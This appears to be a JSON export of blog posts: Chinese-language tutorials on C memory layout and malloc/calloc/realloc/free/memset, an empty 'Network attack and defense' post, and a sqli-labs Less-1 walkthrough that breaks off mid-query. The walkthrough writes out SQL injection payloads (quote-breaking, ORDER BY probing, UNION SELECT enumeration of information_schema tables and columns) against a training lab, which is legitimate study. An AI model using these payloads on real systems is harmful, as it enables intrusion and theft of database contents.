[{"title":"C语言内存管理","date":"2019-06-17T09:25:05.000Z","updated":"2019-06-17T09:24:37.975Z","content":"0x01 内存存储结构\n为什么要这么分配内存？（1）一个进程在运行过程中，代码是根据流程依次执行的，只需要访问一次，当然跳转和递归有可能使代码执行多次，而数据一般都需要访问多次，因此单独开辟空间以方便访问和节约空间。（2）临时数据及需要再次使用的代码在运行时放入栈区中，生命周期短。（3）全局数据和静态数据有可能在整个程序执行过程中都需要访问，因此单独存储管理。（4）堆区由用户自由分配，以便管理。\n\n存储结构分为：可执行代码存储时结构和运行时存储结构。结构图如下，左边为可执行代码存储时结构，右边为运行时存储结构。\n\n0x001 可执行代码存储时结构当一个.c或.cpp文件编译后生    成可执行文件时，可执行文件在存储（也就是还没有载入到内存中）的时候，分为：代码区、数据区和未初始化数据区3个部分。\n\n注意：\n\n代码区：text segment\n数据区：局初始化数据区/静态数据区（initialized data segment/data segment）\n未初始化区：亦称BSS区（uninitialized data segment）\n\n\n\n代码区（text segment）。存放CPU执行的机器指令（machine instructions）。通常，代码区是可共享的（即另外的执行程序可以调用它），因为对于频繁被执行的程序，只需要在内存中有一份代码即可。代码区通常是只读的，使其只读的原因是防止程序意外地修改了它的指令。另外，代码区还规划了局部变量的相关信息。\n\n全局初始化数据区/静态数据区（initialized data segment/data segment）。该区包含了在程序中明确已被初始化的全局变量、静态变量（包括全局静态变量和局部静态变量）和常量数据（如字符串常量）。\n\n未初始化数据区。亦称BSS区（uninitialized data segment），存入的是全局未初始化变量。BSS这个叫法是根据一个早期的汇编运算符而来，这个汇编运算符标志着一个块的开始。BSS区的数据在程序开始执行之前被内核初始化为0或者空指针（NULL）\n\n\n0x002 运行时存储结构一个正在运行着的C编译程序占用的内存分为代码区、初始化数据区、未初始化数据区、堆区和栈区5个部分。\n\n代码区（text segment/code segment）。代码区指令根据程序设计流程依次执行，对于顺序指令，则只会执行一次（每个进程），如果反复，则需要使用跳转指令，如果进行递归，则需要借助栈来实现。\n\n代码段（区）：定义： 代码段（code segment/text segment ）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。代码区的指令中包括操作码和要操作的对象（或对象地址引用）。如果是立即数（即具体的数值，如5），将直接包含在代码中；如果是局部数据，将在栈区分配空间，然后引用该数据地址；如果是BSS区和数据区，在代码中同样将引用该数据地址。另外，代码段还规划了局部数据所申请的内存空间信息。\n\n\n全局初始化数据区/静态数据区（Data Segment）。只初始化一次。\n\n数据段（区）： 数据段（data segment ）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。data段中的静态数据区存放的是程序中已初始化的全局变量、静态变量和常量。\n\n\n未初始化数据区（BSS）。在运行时改变其值。\n\nBSS 段（区）： BSS 段（bss segment ）通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS 是英文Block Started by Symbol 的简称。BSS 段属于静态内存分配，即程序一开始就将其清零了。一般在初始化时BSS段部分将会清零。\n\n\n栈区（stack）。由编译器自动分配释放，存放函数的参数值、局部变量的值等。存放函数的参数值、局部变量的值，以及在进行任务切换时存放当前任务的上下文内容。其操作方式类似于数据结构中的栈。每当一个函数被调用，该函数返回地址和一些关于调用的信息，比如某些寄存器的内容，被存储到栈区。然后这个被调用的函数再为它的自动变量和临时变量在栈区上分配空间，这就是C实现函数递归调用的方法。每执行一次递归函数调用，一个新的栈框架就会被使用，这样这个新实例栈里的变量就不会和该函数的另一个实例栈里面的变量混淆。\n\n栈(stack) ：栈又称堆栈， 是用户存放程序临时创建的局部变量，也就是说我们函数括弧”{}”中定义的变量（但不包括static 声明的变量，static 意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存/ 恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。\n\n\n堆区（heap）。用于动态内存分配。堆在内存中位于bss区和栈区之间。一般由程序员分配和释放，若程序员不释放，程序结束时有可能由OS回收。\n\n堆(heap)： 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc 等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free 等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。在将应用程序加载到内存空间执行时，操作系统负责代码段、数据段和BSS段的加载，并将在内存中为这些段分配空间。栈段亦由操作系统分配和管理，而不需要程序员显示地管理；堆段由程序员自己管理，即显式地申请和释放空间。\n\n\n\nC语言程序编译完成之后，已初始化的全局变量保存在DATA段中，未初始化的全局变量保存在BSS段中。TEXT和DATA段都在可执行文件中，由系统从可执行文件中加载；而BSS段不在可执行文件中，由系统初始化。BSS段只保存没有值的变量，所以事实上它并不需要保存这些变量的映像。运行时所需要的BSS段大小记录在目标文件中，但是BSS段并不占据目标文件的任何空间。\n以下两图来自于《C语言专家编程》\n\n\n\n0x003 几个基本概念在C语言中，关于内存管理的知识点比较多，如函数、变量、作用域、指针等，在探究C语言内存管理机制时，先简单复习下这几个基本概念：\n\n变量：需要搞清楚这几种变量类型：\n\n全局变量（外部变量）：出现在代码块{}之外的变量就是全局变量。\n局部变量（自动变量）：一般情况下，代码块{}内部定义的变量就是自动变量，也可使用auto显示定义。\n静态变量：是指内存位置在程序执行期间一直不改变的变量，用关键字static修饰。代码块内部的静态变量只能被这个代码块内部访问，代码块外部的静态变量只能被定义这个变量的文件访问。\n\n\n\n注意：extern修饰变量时，根据具体情况，既可以看作是定义也可以看作是声明；但extern修饰函数时只能是定义，没有二义性。\n\n作用域：通常指的是变量的作用域，广义上讲，也有函数作用域及文件作用域等。我理解的作用域就是指某个事物能够存在的区域或范围，比如一滴水只有在0-100摄氏度之间才能存在，超出这个范围，广义上讲的“水”就不存在了，它就变成了冰或气体。\n\n函数：不解释。\n\n\n注意：C语言中函数默认都是全局的，可以使用static关键字将函数声明为静态函数（只能被定义这个函数的文件访问的函数）。\n0x02 栈与堆栈与堆是两个概念，特别要注意数据结构中的栈与堆和内存管理中的栈与堆是两个不相关的概念。\n0x001 数据结构中的栈与堆栈：是一种连续储存的数据结构，具有先进后出的性质。通常的操作有入栈（圧栈）、出栈和栈顶元素。想要读取栈中的某个元素，就要将其之前的所有元素出栈才能完成。类比现实中的箱子一样。\n\n栈是一种运算受限的线性表，其限制是指只仅允许在表的一端进行插入和删除操作，这一端被称为栈顶（Top），相对地，把另一端称为栈底（Bottom）。把新元素放到栈顶元素的上面，使之成为新的栈顶元素称作进栈、入栈或压栈（Push）；把栈顶元素删除，使其相邻的元素成为新的栈顶元素称作出栈或退栈（Pop）。这种受限的运算使栈拥有“先进后出”的特性（First In Last Out），简称FILO。栈分顺序栈和链式栈两种。栈是一种线性结构，所以可以使用数组或链表（单向链表、双向链表或循环链表）作为底层数据结构。使用数组实现的栈叫做顺序栈，使用链表实现的栈叫做链式栈，二者的区别是顺序栈中的元素地址连续，链式栈中的元素地址不连续。\n\n堆：是一种非连续的树形储存数据结构，每个节点有一个值，整棵树是经过排序的。特点是根结点的值最小（或最大），且根结点的两个子树也是一个堆。常用来实现优先队列，存取随意。\n\n像是一颗倒立的大树：堆是一种经过排序的树形数据结构，每个节点都有一个值。通常我们所说的堆的数据结构是指二叉树。堆的特点是根节点的值最小（或最大），且根节点的两个树也是一个堆。由于堆的这个特性，常用来实现优先队列，堆的存取是随意的，这就如同我们在图书馆的书架上取书，虽然书的摆放是有顺序的，但是我们想取任意一本时不必像栈一样，先取出前面所有的书，书架这种机制不同于箱子，我们可以直接取出我们想要的书。\n\n0x002 内存分配中的堆和栈栈：是由编译器在需要时自动分配的，不需要时自动清除的变量存储区。里面的变量通常是局部变量、函数参数等。堆：是由malloc()等函数或new分配的内存块，内存释放由程序员手动控制，在C语言为free函数完成。\n栈和堆的主要区别有以下几点：\n\n\n申请方式和回收方式不同(管理方式不同)。栈编译器自动管理，无需程序员手工控制；而堆空间的申请释放工作由程序员控制，容易产生内存泄漏。\n\n内存增长方向不同。堆的增长方向是向上的，即向着内存地址增加的方向；栈的增长方向是向下的，即向着内存地址减小的方向。这和栈申请大小是相关的，因为栈顶的地址和栈的最大容量是系统预先规定好的，所以再次申请地址时只能从高地址向低地址存放局部变量或者形式参数。\n\n申请大小的限制。栈是向低地址扩展的数据结构，是一块连续的内存区域。这句话的意思是栈顶的地址和栈的最大容量是系统预先规定好的，当申请的空间超过栈的剩余空间时，将提示溢出。因此，用户能从栈获得的空间较小。栈不会很大，一般都是以K为单位。如果在程序中直接将较大的数组保存在函数内的栈变量中，很可能会内存溢出，严格来说应该叫栈溢出（当栈空间以满，但还往栈内存压变量，这个就叫栈溢出）。堆是向高地址扩展的数据结构，是不连续的内存区域。因为系统是用链表来存储空闲内存地址的，且链表的遍历方向是由低地址向高地址。由此可见，堆获得的空间较灵活，也较大。栈中元素都是一一对应的，不会存在一个内存块从栈中间弹出的情况。\n\n申请后系统的响应不同。栈：只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出。堆：首先应该知道操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中删除，并将该结点的空间分配给程序。对于大多数系统，会在这块内存空间中的首地址处记录本次分配的大小，这样，代码中的delete语句才能正确的释放本内存空间。由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放入空闲链表中。也就是说堆会在申请后还要做一些后续的工作这就会引出申请效率的问题。\n\n分配效率不同。栈：由系统自动分配，速度较快。但程序员是无法控制的。堆：是由new分配的内存，一般速度比较慢，而且容易产生内存碎片，不过用起来最方便。\n\n\n\n栈是机器系统提供的数据结构，计算机会在底层对栈提供支持：分配专门的寄存器存放栈的地址，压栈出栈都有专门的指令执行。堆则是C函数库提供的，它的机制很复杂，例如为了分配一块内存，库函数会按照一定的算法（具体的算法可以参考数据结构/操作系统）在堆内存中搜索可用的足够大的空间，如果没有足够大的空间（可能是由于内存碎片太多），就有需要操作系统来重新整理内存空间，这样就有机会分到足够大小的内存，然后返回。显然，堆的效率比栈要低得多。\n\n\n是否产生碎片。堆：对于堆来讲，频繁的malloc/free（new/delete）势必会造成内存空间的不连续，从而造成大量的碎片，使程序效率降低（虽然程序在退出后操作系统会对内存进行回收管理）。栈：对于栈来讲，则不会产生碎片。\n\n栈和堆中的存储内容不同。栈：在函数调用时，第一个进栈的是主函数中后的下一条指令（函数调用语句的下一条可执行语句）的地址，然后是函数的各个参数，在大多数的C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。注意静态变量是不入栈的。当本次函数调用结束后，局部变量先出栈，然后是参数，最后栈顶指针指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行。栈中的内存是在程序编译完成以后就可以确定的，不论占用空间大小，还是每个变量的类型。堆：一般是在堆的头部用一个字节存放堆的大小。堆中的具体内容由程序员安排。\n\n\n下面附上一张栈和堆地址增长方向的对比图：\n0x03 操作系统中的内存分配操作系统在管理内存时，最小单位不是字节，而是内存页（32位操作系统的内存页一般是4K）。比如，初次申请1K内存，操作系统会分配1个内存页，也就是4K内存。4K是一个折中的选择，因为：内存页越大，内存浪费越多，但操作系统内存调度效率高，不用频繁分配和释放内存；内存页越小，内存浪费越少，但操作系统内存调度效率低，需要频繁分配和释放内存。嵌入式系统的内存内存资源很稀缺，其内存页会更小，因此在嵌入式开发当中需要特别注意。\n\n参考资料：\n\n《深入理解C语言内存管理》\n\n《C语言知识整理（3）：内存管理（详细版）》\n\n《C语言内存管理详解》\n\n《堆与栈的区别》\n\n《【C语言】数据结构和内存中的堆和栈》\n\n\n","thumbnail":"https://i.loli.net/2019/06/17/5d07368a6119054318.png","plink":"https://Directoree.github.io/post/memory-management/"},{"title":"C/C++ Memory Application","date":"2019-06-06T15:06:55.000Z","updated":"2019-06-17T09:27:06.058Z","content":"0x01 malloc() &amp; calloc()\nvoid *malloc ( size );\n\nmalloc的作用是在内存的动态存储区中分配一个长度为size的连续空间。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之,如果这部分内存曾经被分配过,则其中可能遗留有各种各样的数据。所以一般mallc()要配合memset()函数使用。\n\n\nvoid *calloc ( n, size );\n\ncalloc() 在内存中动态地分配 n 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num x size 个字节长度的内存空间，并且每个字节的值都是0。\n\n\n\n\n1. 相似点：\n\n\n动态内存申请都需要用到头文件#include &lt;stdlib.h&gt;。\nmalloc()、calloc()申请的内存类型都是 void* 类型的，需要强制转化为指定类型；注意：函数的返回值类型是void*，void 并不是说没有返回值或者返回空指针，而是返回的指针类型未知。所以在使用 calloc() 时通常需要进行强制类型转换，将 void 指针转换成我们希望的类型，例如：\nchar *ptr = (char *)malloc(100); // 分配100个字节的内存空间\n\n\n返回值：\n\n如果调用成功,函数malloc()和函数calloc()都将返回所分配的内存空间的首地址。\n如果调用失败，则返回 NULL。\n\n\n申请了内存空间后，必须检查是否分配成功。\n函数同样要注意这点：如果所申请的内存块大于目前堆上剩余内存块（整块），则内存分配会失败，函数返回NULL。注意这里说的“堆上剩余内存块”不是所有剩余内存块之和，是指堆上剩余内存块中与上次申请的内存地址连续的那部分，因为malloc函数申请的是连续的一块内存。既然malloc函数申请内存有不成功的可能，那我们在使用指向这块内存的指针时，必须用if（p!=NULL）语句来验证内存确实分配成功了。\n\n\n二者返回的地址是连续的：下面两种方式申请地址大小是相等的\nchar *str1 = (char *)calloc(10, 2);\nchar *str2 = (char *)malloc(20);\n\n\n\n\n2. 不相同点：\n\n\n函数malloc()和函数calloc()的主要区别是前者不能初始化所分配的内存空间,而后者能。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之，如果这部分内存曾经被分配过，则其中可能遗留有各种各样的数据。\n函数calloc()会将所分配的内存空间中的每一位都初始化为零，也就是说,如果你是为字符类型或整数类型的元素分配内存，那么这些元素将保证会被初始化为0；如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针；如果你为实型数据分配内存，则这些元素会被初始化为浮点型的零。\ncalloc 可以代替 malloc + memset，但是 malloc + memset 代替不了 calloc。 calloc 大块内存时，如果是从系统分配，就可以免了 memset 的操作，快很多。memset可以设任意数，calloc只能设0 。calloc表示申请 n x size大小的内存，malloc只有一个参数。\n\n\n3. 以下两种方式完全等价：\n\n// calloc() 分配内存空间并初始化\nchar *str1 = (char *)calloc(10, 2);\n// malloc() 分配内存空间并用 memset() 初始化\nchar *str2 = (char *)malloc(20);\nmemset(str2, 0, 20);\n\n0x02 realloc()函数原型：realloc(void *p, addsize)\n一、基本特性\n\nrealloc()函数可以重用或扩展以前用malloc()、calloc()及realloc()函数自身分配的内存。\n\nrealloc()函数需两个参数：一个是包含地址的指针（该地址由之前的malloc()、calloc()或realloc()函数返回），另一个是要新分配的内存字节数。\n\nrealloc()函数分配第二个参数指定的内存量，并把第一个参数指针指向的之前分配的内容复制到新配的内存中，且复制的内容长度等于新旧内存区域中较小的那一个。即新内存大于原内存，则原内存所有内容复制到新内存，如果新内存小于原内存，只复制长度等于新内存空间的内容。\n\nrealloc()函数的第一个参数若为空指针，相当于分配第二个参数指定的新内存空间，此时等价于malloc()、calloc()或realloc()函数。\n\n如果是将分配的内存扩大，则有以下3种情况：\n\n\n如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。  \n如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并自动将原来的数据块释放掉，不需要使用free()再释放一次，返回新的内存块首地址（不同于之前malloc申请的首地址）。\n如果申请失败，将返回NULL，此时，原来的指针仍然有效。\n\n\n\n\n\n二、注意事项\n\n第一个参数要么是空指针，要么是指向以前分配的内存。如果不指向以前分配的内存或指向已释放的内存，结果就是不确定的。\n\n如果调用成功，不管当前内存段后面的空闲空间是否满足要求，都会释放掉原来的指针，重新返回一个指针，虽然返回的指针有可能和原来的指针一样，即不能再次释放掉原来的指针。\n\n\n\n举例（不需要手动free释放原来的首地址指针，realloc若新申请成功会自动释放原来的首地址。），实现在一个按升序排序的数组中查找x应插入的位置，将x插入数组中，使数组元素仍按升序排列。注意：注意代码45行 free(pNumber);，如果注释掉，则结果正确。如果不注释掉则错误。\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\nint main()\n{\n    int n = 0;\n    int i = 0;\n    int index = 0;\n    int insert_data = 0;\n    int *pNumber = NULL;\n    int *pNewArray = NULL;\n    printf(\"Input array size:\\n\");\n    scanf(\"%d\", &amp;n);\n    pNumber = (int*)calloc(n, sizeof(int));\n    if(pNumber == NULL)\n    {\n        printf(\"Not enough memory\\n\");\n        exit(0);\n    }\n    //输入插入前已按升序排序的数组元素提示信息\n    printf(\"Input array:\\n\");\n    for(i = 0; i &lt; n; i++)\n    {\n        scanf(\"%d\", pNumber+i);\n    }\n    //输入待插入的元素x提示信息：\n    printf(\"Input x:\\n\");\n    scanf(\"%d\", &amp;insert_data);\n    //确定待插入位置的索引值\n    for(i = 0; i &lt; n; i++)\n    {\n        if(insert_data &lt; *(pNumber+i))\n        {\n            index = i;\n            break;\n        }\n    }\n    //用realloc()新分配一块内存，用于存储原数组和新插入的值\n    pNewArray = (int*)realloc(pNumber, (n+1)*sizeof(int));\n    if(pNewArray == NULL)\n    {\n        printf(\"Not enough memory\\n\");\n        exit(0);\n    }\n    //free(pNumber); \n    //输出新分配的内存空间的值，查看是否实现了复制\n    for(i = 0; i &lt; n+1; i++)\n    {\n        printf(\"%4d\", pNewArray[i]);\n    }\n    printf(\"\\n\");\n    //待插入位置及后面的所有数据依次向后移1位\n    for(i = n; i  > index; i--)\n    {\n        *(pNewArray+i) = pNewArray[i-1];\n    }\n    *(pNewArray + index) = insert_data;\n    printf(\"After insert %d:\\n\", insert_data);\n    for(i = 0; i &lt; n+1; i++)\n    {\n        printf(\"%4d\", *(pNewArray+i));\n    }\n    free(pNewArray);\n    return 0;\n}\n\n\n0x03 free() &amp; memset()0x001 free()free()函数声明：void free(void *ptr);\n\n说明：释放ptr指向的内存空间，ptr必须是之前调用过malloc,calloc,realloc这三个函数返回的，否则，如果free(ptr)已经执行过了，而又没有重新赋值给ptr的话，又执行一次free(ptr)会导致意外发生（undefined behavior occurs.），如果ptr指向的是NULL，则不会做任何操作。\n\n示例：\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\nint main()\n{\n    char *p = NULL;\n    p = (char*)malloc(sizeof(p));\n    if(p==NULL)\n    {\n        printf(\"You are failed to applicate the memory.\\n\");\n        exit(1);\n    }\n    free(p);\n    p=NULL; //一定要给p赋个值NULL，否则再次free(p)会报错\n\n\n其实它就做了一件事：斩断指针变量与这块内存的关系。\n\nfree函数就是把这块内存和p之间的所有关系斩断。从此p和那块内存之间再无瓜葛。至于指针变量p本身保存的地址并没有改变（即指针p的值仍然是刚才的地址，只是再也不能通过p来使用刚才的地址了。），但是它对这个地址处的那块内存却已经没有所有权了。那块被释放的内存里面保存的值也没有改变，只是再也没有办法使用了。\n\n这就是free函数的功能。按照上面的分析，如果对p连续两次以上使用free函数，肯定会发生错误。因为第一使用free函数时，p所属的内存已经被释放，第二次使用时已经无内存可释放了。\nmalloc两次只free一次会内存泄漏；malloc一次free两次肯定会出错。也就是说，在程序中malloc的使用次数一定要和free相等，否则必有错误。这种错误主要发生在循环使用malloc函数时，不要把malloc和free对数弄错了。\n内存释放之后，既然使用free函数之后指针变量p本身保存的地址并没有改变，那我们就需要重新把p的值变为NULL。\n释放完块内存之后，没有把指针置NULL，这个指针就成为了“野指针”，也有书叫“悬垂指针”。这是很危险的，而且也是经常出错的地方。所以一定要记住一条：free完之后，一定要给指针置NULL。\n\n\n注意：内存已经被释放了，但是继续通过指针来使用！\n\n这里一般有三种情况：第一种：就是上面所说的，free（p）之后，继续通过p指针来访问内存。解决的办法就是给p置NULL。第二种：函数返回栈内存。这是初学者最容易犯的错误。比如在函数内部定义了一个数组，却用return语句返回指向该数组的指针。解决的办法就是弄明白栈上变量的生命周期。第三种：内存使用太复杂，弄不清到底哪块内存被释放，哪块没有被释放。解决的办法是重新设计程序，改善对象之间的调用关系。\n\n0x002 memset()函数声明：void *memset(void *s, int c, unsigned long n);\n定义变量时一定要进行初始化，尤其是数组和结构体这种占用内存大的数据结构。在使用数组的时候经常因为没有初始化而产生“烫烫烫烫烫烫”这样的野值，俗称“乱码”。\n每种类型的变量都有各自的初始化方法，memset() 函数可以说是初始化内存的“万能函数”，通常为新申请的内存进行初始化工作。它是直接操作内存空间，mem即“内存”（memory）的意思。该函数的原型为：\n# include &lt;string.h>\nvoid *memset(void *s, int c, unsigned long n);\n\n函数的功能是：将指针变量 s 所指向的前 n 字节的内存单元用一个“整数” c 替换，注意 c 是 int 型。s 是 void* 型的指针变量，所以它可以为任何类型的数据进行初始化。\nmemset() 的作用是在一段内存块中填充某个给定的值。因为它只能填充一个值，所以该函数的初始化为原始初始化，无法将变量初始化为程序中需要的数据。用memset初始化完后，后面程序中再向该内存空间中存放需要的数据。\nmemset 一般使用“0”初始化内存单元，而且通常是给数组或结构体进行初始化。一般的变量如 char、int、float、double 等类型的变量直接初始化即可，没有必要用 memset。如果用 memset 的话反而显得麻烦。\n当然，数组也可以直接进行初始化，但 memset 是对较大的数组或结构体进行清零初始化的最快方法，因为它是直接对内存进行操作的。\n这时有人会问：“字符串数组不是最好用’\\0’进行初始化吗？那么可以用 memset 给字符串数组进行初始化吗？也就是说参数 c 可以赋值为’\\0’吗？”\n可以的。虽然参数 c 要求是一个整数，但是整型和字符型是互通的。但是赋值为 ‘\\0’ 和 0 是等价的，因为字符 ‘\\0’ 在内存中就是 0。所以在 memset 中初始化为 0 也具有结束标志符 ‘\\0’ 的作用，所以通常我们就写“0”。\nmemset 函数的第三个参数 n 的值一般用 sizeof()  获取，这样比较专业。注意，如果是对指针变量所指向的内存单元进行清零初始化，那么一定要先对这个指针变量进行初始化，即一定要先让它指向某个有效的地址。而且用memset给指针变量如p所指向的内存单元进行初始化时，n 千万别写成 sizeof(p)，这是新手经常会犯的错误。因为 p 是指针变量，不管 p 指向什么类型的变量，sizeof(p) 的值都是 4。\n下面写一个程序：\n# include &lt;stdio.h>\n# include &lt;string.h>\nint main(void)\n{\n    int i;  //循环变量\n    char str[10];\n    char *p = str;\n    memset(str, 0, sizeof(str));  //只能写sizeof(str), 不能写sizeof(p)\n    for (i=0; i&lt;10; ++i)\n    {\n        printf(\"%d\\x20\", str[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}\n根据memset函数的不同，输出结果也不同，分为以下几种情况：\nmemset(p, 0, sizeof(p));  //地址的大小都是4字节\n0 0 0 0 -52 -52 -52 -52 -52 -52\n\nmemset(p, 0, sizeof(*p));  //*p表示的是一个字符变量, 只有一字节\n0 -52 -52 -52 -52 -52 -52 -52 -52 -52\n\nmemset(p, 0, sizeof(str));\n0 0 0 0 0 0 0 0 0 0\n\nmemset(str, 0, sizeof(str));\n0 0 0 0 0 0 0 0 0 0\n\nmemset(p, 0, 10);  //直接写10也行, 但不专业\n0 0 0 0 0 0 0 0 0 0\n\n0x04 Summary0x001 C/C++程序内存分配\n\n注意：\n\n内存泄漏(仅存在程序运行时，程序退出，OS将回收所有资源)是指那些本应该回收（不再使用）的内存对象无法被系统回收的现象。在c/c++中需要程序猿手动释放内存对象，所以在C/C++中更容易存在内存泄漏。java引入了自动回收机制，使得在C/C++中令人头疼的内存问题得到了有效的改善，但这并不意味着java程序员不关注内存，因为垃圾回收机制不能完全保证内存对象在该释放的地方释放.\n内存溢出指的是系统在为某段执行指令（程序）分配内存的时候，发现内存不足，抛出错误。\n\n\n\n0x002 C/C++内存分配方式\n\n在栈上创建在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放.栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限.\n从堆上分配，亦称动态内存分配程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存.动态内存的生存期由用户决定，使用非常灵活，但问题也最多.\n从静态存储区域分配内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在.例如全局变量、static变量.\n\n\n\n0x003 C语言内存申请相关的函数\n\nalloca 是向栈申请内存,因此无需释放.\nmalloc 分配的内存是位于堆中的，并且没有初始化内存的内容，malloc() 不初始化，里边数据是未知的垃圾数据，因此基本上malloc之后,调用函数memset来初始化这部分的内存空间.\ncalloc 则将初始化这部分的内存，设置为0。\nrealloc 则对malloc申请的内存进行大小的调整。\n申请的内存最终需要通过函数free来释放。注意：当程序运行过程中malloc了,但是没有free的话,会造成内存泄漏.一部分的内存没有被使用,但是由于没有free,因此系统认为这部分内存还在使用,造成不断的向系统申请内存,使得系统可用内存不断减少.但是内存泄漏仅仅指程序在运行时,程序退出时,OS将回收所有的资源.因此,适当的重起一下程序,有时候还是有点作用.\n\n\n\n0x004 malloc，realloc，calloc函数声明\n\nvoid* malloc(unsigned size);\nvoid realloc(void ptr, unsigned newsize);\nvoid* calloc(size_t numElements, size_t sizeOfElement); \n\n\n\n注意：都在stdlib.h函数库内，它们的返回值都是请求系统分配的地址,如果请求失败就返回NULL.(1)函数malloc()在内存的动态存储区中分配一块长度为size字节的连续区域，参数size为需要内存空间的长度，返回该区域的首地址.(2)函数calloc()与malloc相似,参数sizeOfElement为申请地址的单位元素长度,numElements为元素个数，即在内存中申请numElements*sizeOfElement字节大小的连续地址空间.(3)函数realloc()给一个已经分配了地址的指针重新分配空间,参数ptr为原有的空间地址,newsize是重新申请的地址长度.\n\n\n\n函数malloc不能初始化所分配的内存空间，而函数calloc能。如果由malloc()函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之, 如果这部分内存曾经被分配过，则其中可能遗留有各种各样的垃圾数据。也就是说，使用malloc()函数的程序开始时(内存空间还没有被重新分配)能正常进行,但经过一段时间(内存空间还已经被重新分配)可能会出现问题。\n函数calloc() 会将所分配的内存空间中的每一位都初始化为零，也就是说，如果你是为字符类型或整数类型的元素分配内存，那么这些元素将保证会被初始化为0；如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针；如果你为实型数据分配内存，则这些元素会被初始化为浮点型的零。\n函数malloc向系统申请分配指定size个字节的内存空间.返回类型是 void*类型。void*表示未确定类型的指针。C,C++规定，void* 类型可以强制转换为任何其它类型的指针。 \nrealloc可以对给定的指针所指的空间进行扩大或者缩小，无论是扩张或是缩小，原有内存的中内容将保持不变.当然，对于缩小，则被缩小的那一部分的内容会丢失。realloc并不保证调整后的内存空间和原来的内存空间保持同一内存地址。相反，realloc返回的指针很可能指向一个新的地址。\nrealloc是从堆上分配内存的。当扩大一块内存空间时，realloc()试图直接从堆上现存的数据后面的那些字节中获得附加的字节，如果能够满足，自然天下太平；如果数据后面的字节不够，问题就出来了，那么就使用堆上第一个有足够大小的自由块，现存的数据然后就被拷贝至新的位置，而老块则放回到堆上。这句话传递的一个重要的信息就是数据可能被移动。\n\n\n参考资料：参考资料：\n\n《C 内存管理》\n\n《C语言中文网-C语言教程》\n\n《C语言深度剖析【进阶篇】》\n\n《如何使用 malloc 函数》]\n《【C语言】malloc、calloc、realloc的区别》\n《C语言—动态内存分配之malloc与realloc的区别》\n《C语言中malloc()和calloc()c函数用法》\n《C语言calloc()函数：分配内存空间并初始化》\n《关于C语言中的malloc和free函数的用法》 \n《c语言深度剖析》----陈正冲\n\n《读书笔记之：C语言深度剖析》\n\n\n《memset函数及其用法，C语言memset函数详解》\n\n\n\n\n\n","thumbnail":"https://i.loli.net/2019/06/06/5cf8bc144d93293008.png","plink":"https://Directoree.github.io/post/memory/"},{"title":"Network attack and defense","date":"2019-06-01T17:31:45.000Z","updated":"2019-06-01T17:39:09.430Z","content":"(〃￣︶￣)人(￣︶￣〃)\n\n\n\n\t\n    \n\t\n\n\n","thumbnail":"https://i.loli.net/2019/06/02/5cf2b69f1a47c16907.png","plink":"https://Directoree.github.io/post/Network-attack-and-defense/"},{"title":"sqli-labs","date":"2019-05-08T05:34:16.000Z","updated":"2019-06-01T17:33:34.935Z","content":"Less-1\n\n根据提示输入id\n?id=1\n回显为：\nWelcome    Dhakkan \nYour Login name:Dumb\nYour Password:Dumb\n再将 id 换成其他值，得到回显的是 id 对应的的登录名和密码，一直试到id=15发现没有了。\n这个时候就应该构造错误的语句去猜测SQL 查询语句是怎么样的，从而得到报错信息（通常包含重要的信息）进而进一步接近目标。构造：\n?id=1&#39;\n得到 回显\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near         &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1\n得知：    \n\n\n\n数据库是MYSQL\n\n大致语句应该是SELECT xxx FROM xxx WHERE id=[] LIMIT 0,1\n接着输入：?id=1 and 1=2 --+回显内容正常，则说明不是数字型注入，接着构造：\n?id=1&#39; and 1=2--+发现回显为空，则猜测正确是属于基于字符型的注入。\n\n\n\n看看数据有多少列\n?id=1&#39; order by 5--+\n回显Unknown column &#39;5&#39; in &#39;order clause&#39;\n说明列数小于5，接着使列数逐渐减小发现列数为3正好正确，说明这个数据表中有3列。\n\n查看显示位数：\n?id=-1&#39; union select 1,2,3--+\n回显\nYour Login name:2\nYour Password:3\n\n爆破表名\n?id=-1&#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+\n回显：\nYour Login name:emails,referers,uagents,users\nYour Password:2\n\n爆破users表的所有字段：\nid=-1&#39; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database() and 